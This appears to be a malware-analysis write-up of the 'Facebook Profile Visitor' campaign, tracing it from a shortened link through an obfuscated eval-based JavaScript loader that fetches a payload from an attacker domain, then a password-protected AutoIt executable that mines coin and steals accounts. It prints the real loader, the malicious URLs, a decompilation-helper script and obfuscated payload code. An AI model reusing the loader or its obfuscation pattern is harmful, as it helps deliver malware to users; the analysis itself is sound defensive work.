# How Facebook Profile Visitor virus works?
## What is it?
<i>Facebook Profile Visitor</i> (Sometimes also called <i>Profile Visitor</i>) is a virus that has spread on Facebook since 03/2020 until now.

## What does it do?
It mines coin (particularly XMRIG) on your computer and stoles your Facebook account to spread the virus.

## Example?
![Vietnamese version of the virus](https://user-images.githubusercontent.com/68118236/145680558-47cabfdf-95be-4eae-b13b-7e7fc62a0a43.png)
<br>Vietnamese version of the virus that spread on Facebook, said "Hello, you can know who visited your profile with the Profile Visitor app"

## VirusTotal and Any.run
[VirusTotal](https://www.virustotal.com/gui/file/f479135d5db8e2f6dff59252b8e51ebd9414a226df908f994376415c20b9446d/detection)
[Any.run](https://app.any.run/tasks/c13f22e8-be22-4ea2-b350-a97efcfd948e)

## How does it work?
<b>Be careful when clicking any of these links!!!</b>

### 1) The link in the Facebook post - how it spread
As you can see in the picture above, the post has the text said "Hello, you can know who visited your profile with the Profile Visitor app", and then the link, and then some pictures of people who visited the person who post's profile (I don't know if that is the real information or not).
<br> The link come in the form of `https://is.gd/` and then some id, for example `dZCN4W`. After some search I found that is.gd is an URL shortener service (but it might be built only for this purpose of spreading the virus onto Facebook)
<br> After clicking the link, it redirects you to the Google Storage API URL.

### 2) Google Storage API
Then you come to some links like `https://storage.googleapis.com/544707c173427ea279a99cbb1451cccb/913820487?ref=facebook&cid=b4a011cf-effb-fc9b-d533-ecc9323874a9&zip=ProfileVisitors%20v5.1.zip&exe=visitors.facebook.com`
<br> It is a REAL data stored on Google Storage on Google Cloud, and if you click view source, the following things comes:
```html

<!DOCTYPE html>
<html translate="no" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
    <script type="text/javascript">
      var bcddet = this;
var gxcei = [95,94,109,92,97,33,27,97,109,109,105,108,51,40,40,104,100,98,102,39,102,94,40,91,101,104,91,39,105,97,105,56,109,98,102,94,54,27,36,61,90,109,94,39,103,104,112,33,34,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,107,94,108,105,104,103,108,94,34,116,6,3,25,25,107,94,109,110,107,103,25,107,94,108,105,104,103,108,94,39,109,94,113,109,33,34,52,6,3,118,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,93,90,109,90,34,116,6,3,25,25,93,104,92,110,102,94,103,109,39,112,107,98,109,94,33,93,90,109,90,34,52,6,3,118,34,52];
var tvswn = "";
var rtpbo = 7;
var cvzkg = "length";
for(czzgv=0;czzgv<gxcei[cvzkg];czzgv++){
	var odygqq = "String";
	var unyrua = "fromCharCode";
	tvswn += bcddet[odygqq][unyrua](gxcei[czzgv]+rtpbo);
}
var bpvsum = "eval";
bcddet[bpvsum](tvswn);

    </script>
  </head>
  <body></body>
</html>
```
<br> You can also view the file `web.html` in this repo.
<br> The HTML code is mostly encoded in the array `gxcei`. This trick is often used to encode the source code that creator does not want clients to view. After cleaning and decoding, it becomes:
```html
<!DOCTYPE html>
<html translate="no" dir="ltr">
<head>
  <meta charset="utf-8">
  <title></title>
  <script type="text/javascript">
  var gxcei = [95,94,109,92,97,33,27,97,109,109,105,108,51,40,40,104,100,98,102,39,102,94,40,91,101,104,91,39,105,97,105,56,109,98,102,94,54,27,36,61,90,109,94,39,103,104,112,33,34,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,107,94,108,105,104,103,108,94,34,116,6,3,25,25,107,94,109,110,107,103,25,107,94,108,105,104,103,108,94,39,109,94,113,109,33,34,52,6,3,118,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,93,90,109,90,34,116,6,3,25,25,93,104,92,110,102,94,103,109,39,112,107,98,109,94,33,93,90,109,90,34,52,6,3,118,34,52];
  var tvswn = "";
  for(counter=0;counter<gxcei.length;counter++){
        tvswn += this.String.fromCharCode(gxcei[counter]+7);
  }
  this.eval(tvswn); // Execute the code

  </script>
</head>
<body>
</body>
</html>
```
<br> Please note that I have added some comments in the code.
<br>The array is decoded as the following Javascript code:
```javascript
fetch("https://okim.me/blob.php?time="+Date.now())
function(response)
{
	return response.text();
}
function(data)
{
	document.write(data);
};
```
<br> So it actually fetch another page, in this case `https://okim.me/blob.php?time=` followed by the current time. The page downloads a zip file into your computer.
<br>![The downloader](https://user-images.githubusercontent.com/68118236/145681336-c1cd118a-ca60-4af1-abd1-189b239f2935.png)
<br> Again, Vietnamese text said "758 download counts" and "The password is 3865". They actually use Google Translate API to translate this, the original things was in English.
<br> You can get the source of it if you want to, see `web` folder in this repo.
<br> <b>Again, some notes: The page sometimes might be blank when Cloudflare block the access of the client (I don't know why)</b>

### 3) The zip
After extract the zip with the provided password, it only has one file named `visitor.facebook.com`. It looks like an old 16-bit app, but actually it is an 64-bit app written in AutoIt scripting language. See VT for more information.
<br> In case you don't know, AutoIt is a interpreter language, which means it has to be phrased and executed at runtime. So, we can get the source code from it easily.

### 4) Decompile
<br> Refer to [VinCSS post](https://blog.vincss.net/2020/02/phuong-phap-trich-xuat-malicious-autoit-script.html), I decompiled it by:
<br> - Use the script below to convert the application to 32-bit app so Exe2Aut can decompile it:
```python
import sys

if len(sys.argv) != 3:
        print "Usage: python.exe autoit64to32.py <AutoItSC.bin> <sample>"
        sys.exit(1)
else:
        try:
                print 'Processing: ' + sys.argv[2]
                print '- Reading ' + sys.argv[1]
                autoitsc_content = open(sys.argv[1], 'rb').read()

                print '- Reading ' + sys.argv[2]
                sample_content  = open(sys.argv[2], 'rb').read()
                
                print '- Looking for the script'
                offset = sample_content.find(b'\xA3\x48\x4B\xBE\x98\x6C\x4A\xA9\x99\x4C\x53\x0A\x86\xD6\x48\x7D')
                if offset != -1:
                        print '- Script found at: 0x%x' % offset
                        sample_content = sample_content[offset:]

                        pe32_filename = sys.argv[2] + '.a32b.exe'
                        print '- Creating 32-bit version: ' + pe32_filename

                        open(pe32_filename, 'wb').write(autoitsc_content + sample_content)
                else:
                        print '- Script not found !'
        except Exception as e:
                print repr(e)
```
<br> - Decompile the source by drag it to Exe2Aut (You can download this online)
<br> - Get the source. The source code is protected by using the obfuscate technique, so it has 17678 lines!

### 5) De-obfuscate
<br> How? If you look at `fb.original.au3`, and scroll down at line 17334, there will be a call to the function `yuqcv()`:
![Main function](https://user-images.githubusercontent.com/68118236/145681966-32b605be-6e64-498d-a569-811e18ef7016.png)
<br> That is the main function! Why? If it is not, the call to the function must be inside another function. Also, all the file are all define of variables and functions, no actually executed code outside the function scope.
<br> Let take a look at it:
```autoit
Func yuqcv()
	$kkdygt = False
	For $i = $hxgunslnvoqp To $loptakx[apdpszx()]
		$jacjdnyx = $dftwmmefiev($uhqytcys($qojrpnaezkx), $loptakx[$i])
		If $jacjdnyx <> $fatiftckytkx Then
			$kkdygt = True
			ExitLoop
		EndIf
	Next
	If $kkdygt = False Then
		$tycocfgddh(nxlara($hauunuxlni & bbrfvej() & "" & ">(hu" & "" & cenlmetaefbs() & "" & scvbk() & $akneqgiits & $hhwbnd[91] & "" & $tsaabo))
		Exit
	Else
		Global $ifhbok = $bretzrnes(huslz("" & $xjxylhdbgpik))
		If $ifhbok = "" Then
			$ifhbok = robuh("" & "Um2" & "" & qbobehimrx())
		EndIf
		umwlcnpqy()
	EndIf
EndFunc
```
The variable `$kkdygt` is defined as False, `$hxgunslnvoqp` as `Local $hxgunslnvoqp = 331 / 331` so equal to 1, `apdpszx()` has the return of `Return 376 - 376` so equal to 0.
<br> But `$loptakx` is another story:
```autoit
$loptakx = $jtpebhivaeht(cxpclkhaarq("" & $wgakprflcmc & "" & $tgcbodidamzf & nebxzuhkbw() & "" & $hhwbnd[87] & "" & $hhwbnd[88] & "" & $hhwbnd[89] & "puV2d" & "" & $hhwbnd[90] & "" & "VB" & $cikmfzzgzvs & jeqcvmwvxxt() & gjyztaed() & "K" & xaheir() & $cnzvfbpz), mljbow("" & hcryswybbj()))
```
<br> `$jtpebhivaeht` is defined as `Execute`, `cxpclkhaarq` is the function `wanzeppkxbwu`:
```autoit
Func wanzeppkxbwu($jpoepgca)
	$qwyarxno = $hhwbnd[30] & "" & $eambenzcvdvn & "" & "t" & "" & $hhwbnd[31] & "" & $hhwbnd[32] & tfxpke() & "" & $hhwbnd[33] & $efsrh & dnvwvcjqt() & "" & sdrkqzqfrt() & "?g" & $edqmzgye & "" & $hhwbnd[34] & "" & $hhwbnd[35] & "N" & "" & "Vn" & "" & $hhwbnd[36] & "._" & "u#" & "" & $hhwbnd[37] & "" & $sbagzydue & $jzzfs & "" & $sngvqrwyrtnf & "" & ghneinwsczwn() & "a" & skjmysrcxuce() & "" & "&" & mgekiaoodq() & $yoqaxkf & $bwfzm & "" & $uuwqp & "" & $ahoipgdmonw & "" & "{0" & $xsqxreif & "" & "2" & "[" & "" & $ztagsubbllpf & ydkvqnum() & wnyebdjkkx() & "" & "GW)" & "" & hkdfwjeedtsk() & $sfiaun & "5]" & rxqwrwgdy() & "" & "f" & ybjzm() & $stgdo & "" & "<3" & "" & "m" & "" & "q" & ">" & kadnznhdlejk() & "8j" & $kbiqgxhyj & lpxty() & "" & bxglmgqytl() & "Z" & "" & $mrlijjcbr & "" & $hhwbnd[38] & "" & $hhwbnd[39]
	$wekfomhxyqf = $gevjrziwuj & liyimzhuyjb() & "" & "D" & "" & yjwrfhucd() & "=Y" & "Z)" & $eebpoy & xcrytctff() & jpleymguxhlq() & "" & mumrojklbr() & "g" & "" & $yxjywaja & "" & $hhwbnd[40] & "" & wexxtm() & $hhwbnd[41] & "" & $hhwbnd[42] & "" & "P" & nbfmdky() & "" & vgsnxik() & "o" & "" & $hhwbnd[43] & "" & $hhwbnd[44] & "v" & "e" & "." & "" & "0" & $copbkndbx & "" & $hhwbnd[45] & $hhwbnd[46] & "" & jtqmalf() & amgwihw() & $hhwbnd[47] & "" & twttad() & "" & "R&" & $hhwbnd[48] & "<" & "" & dzcaeo() & "K" & "" & $hhwbnd[49] & "" & "c" & "" & "+p" & $hhdgedvlvkl & tlgvjkdl() & "@" & qayvoyyp() & "" & mjopojtg() & ozirixnbzbmx() & sprlin() & $hmpexu & $mbljdmws & $hhwbnd[50] & "" & $hhwbnd[51] & "N" & "9" & $hhwbnd[52] & uhlldcg() & tjqlvowz() & "" & tcwieupeopr() & $hhwbnd[53] & "1" & "" & $hhwbnd[54] & $hhwbnd[55] & $uuocjrnuht & "" & $hhwbnd[56] & "" & tokwbfnli() & ":" & $hhwbnd[57]
	Local $tcmtaq = Execute($hhwbnd[58] & $hhwbnd[59] & "" & $hhwbnd[60] & hnrnueyd() & alabpxdb() & $qatcw & $hgdwcntsjcvo & guvuenf())
	Local $tpazve = Execute("" & "St" & "" & sxscidr() & $hpookkbivcrw & "" & phfdpuycr() & "" & "i" & "" & $hhwbnd[61])
	Local $mjquv = Execute(cxxudtshl() & "" & oqpfl() & "" & $nfbyopcmsbfj & qoklfhjskts() & $hhwbnd[62] & $hhwbnd[63])
	Local $bmroqxms
	$ibuiclergcj = $mjquv($jpoepgca)
	For $xwrvti = 0 + 0 To $ibuiclergcj
		$tejvw = $tpazve($jpoepgca, $xwrvti, $hhwbnd[27])
		$glopiobyw = $tcmtaq($qwyarxno, $tejvw, $hhwbnd[28])
		$rdganmja = $tpazve($wekfomhxyqf, $glopiobyw, $hhwbnd[29])
		$bmroqxms &= $rdganmja
	Next
	Return $bmroqxms
EndFunc
```
